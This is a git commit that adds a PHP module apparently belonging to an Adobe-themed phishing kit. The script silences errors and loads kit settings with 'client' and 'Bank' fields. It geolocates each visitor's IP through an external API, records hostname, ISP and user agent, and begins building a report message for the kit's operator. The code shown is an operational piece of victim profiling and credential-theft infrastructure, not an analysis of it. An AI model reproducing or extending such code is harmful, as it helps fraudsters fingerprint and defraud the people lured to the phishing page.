87cd3bdcedb0d28b3aac275dc7f49118a1d15b71
deearr063 <119115999+deearr063@users.noreply.github.com>
2023-07-19 09:23:21 -0400

    Add files via upload

--- adobe/Send/Module/Setmodule.php
+++ adobe/Send/Module/Setmodule.php
@@ -1,1 +1,23 @@
+<?php
+error_reporting(0);
+$settings = include '../settings.php';
+$ip = getenv("REMOTE_ADDR");
+$url = "http://ip-api.com/json/" . $ip;
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+$resp = curl_exec($ch);
+curl_close($ch);
+$details = json_decode($resp, true);
+$countryname = $details['country'];
+$city = $details['city'];
+$isp = $details['isp'];
+$region = $details['regionName'];
+$hostname = gethostbyaddr($ip);
+$useragent = $_SERVER['HTTP_USER_AGENT'];
 
+$zo = $settings['client'];
+$Bank = $settings['Bank'];
+$message .= "Zdravstvuyte Author:  $zo  \n\n"
+?>
